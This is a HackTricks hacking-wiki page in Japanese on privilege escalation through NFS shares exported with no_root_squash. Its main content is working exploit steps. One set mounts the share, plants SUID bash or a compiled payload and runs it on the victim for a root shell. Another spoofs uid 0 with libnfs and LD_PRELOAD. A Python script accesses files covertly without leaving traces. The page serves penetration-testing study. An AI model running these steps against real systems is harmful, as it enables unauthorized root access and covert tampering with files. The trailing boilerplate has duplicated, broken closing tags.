{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}


_ **/etc/exports** _ ファイルを読み、**no\_root\_squash** として設定されているディレクトリが見つかった場合、**クライアントとして**それに**アクセス**し、そのディレクトリの中に**書き込む**ことができます。まるでそのマシンのローカル**root**であるかのように。

**no\_root\_squash**: このオプションは基本的に、クライアントのrootユーザーにNFSサーバー上のファイルにrootとしてアクセスする権限を与えます。これにより深刻なセキュリティ上の問題が生じる可能性があります。

**no\_all\_squash:** これは**no\_root\_squash**オプションに似ていますが、**非rootユーザー**に適用されます。例えば、nobodyユーザーとしてシェルを持ち、/etc/exportsファイルを確認し、no\_all\_squashオプションが存在し、/etc/passwdファイルを確認し、非rootユーザーをエミュレートし、そのユーザーとしてsuidファイルを作成（nfsを使用してマウント）します。そのsuidをnobodyユーザーとして実行し、異なるユーザーになります。

# Privilege Escalation

## Remote Exploit

この脆弱性を見つけた場合、次のように悪用できます：

* **そのディレクトリを**クライアントマシンに**マウントし、rootとしてマウントされたフォルダ内に**/bin/bash**バイナリをコピーし、**SUID**権限を与え、被害者マシンからそのbashバイナリを実行します。
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
* **クライアントマシンでそのディレクトリをマウントし、** マウントされたフォルダ内に **rootとして** SUID権限を悪用するコンパイル済みペイロードをコピーし、それに **SUID** 権限を与え、**被害者** マシンからそのバイナリを **実行** します（ここにいくつかの[C SUIDペイロード](payloads-to-execute.md#c)があります）。
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
## Local Exploit

{% hint style="info" %}
注意してください、もしあなたが**あなたのマシンから被害者のマシンへのトンネルを作成できるなら、必要なポートをトンネリングしてこの特権昇格を悪用するためにリモートバージョンを使用することができます**。\
次のトリックは、ファイル`/etc/exports`が**IPを示している場合**です。この場合、**リモートエクスプロイトを使用することはできず**、**このトリックを悪用する必要があります**。\
エクスプロイトが機能するためのもう一つの必要条件は、**`/etc/export`内のエクスポートが`insecure`フラグを使用していることです**。\
\--_もし`/etc/export`がIPアドレスを示している場合、このトリックが機能するかどうかはわかりません_--
{% endhint %}

## Basic Information

このシナリオは、ローカルマシン上のマウントされたNFS共有を悪用し、クライアントがそのuid/gidを指定できるNFSv3仕様の欠陥を利用して、無許可のアクセスを可能にするものです。悪用には、NFS RPCコールの偽造を可能にするライブラリ[libnfs](https://github.com/sahlberg/libnfs)を使用します。

### Compiling the Library

ライブラリのコンパイル手順は、カーネルバージョンに基づいて調整が必要な場合があります。この特定のケースでは、fallocateシステムコールがコメントアウトされていました。コンパイルプロセスには、次のコマンドが含まれます：
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
### 攻撃の実行

攻撃は、特権をルートに昇格させ、シェルを実行するシンプルなCプログラム（`pwn.c`）を作成することを含みます。プログラムはコンパイルされ、結果として得られたバイナリ（`a.out`）は、RPC呼び出しでuidを偽装するために`ld_nfs.so`を使用して、suid rootで共有に配置されます。

1. **攻撃コードをコンパイルする:**
```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```

2. **攻撃を共有に配置し、uidを偽装してその権限を変更する:**
```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```

3. **攻撃を実行してルート権限を取得する:**
```bash
/mnt/share/a.out
#root
```

## ボーナス: NFShellによるステルスファイルアクセス
ルートアクセスが取得されたら、所有権を変更せずにNFS共有と対話するために（痕跡を残さないために）、Pythonスクリプト（nfsh.py）が使用されます。このスクリプトは、アクセスされるファイルのuidに一致するようにuidを調整し、権限の問題なしに共有上のファイルと対話できるようにします:
```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
実行するには：
```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```
{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
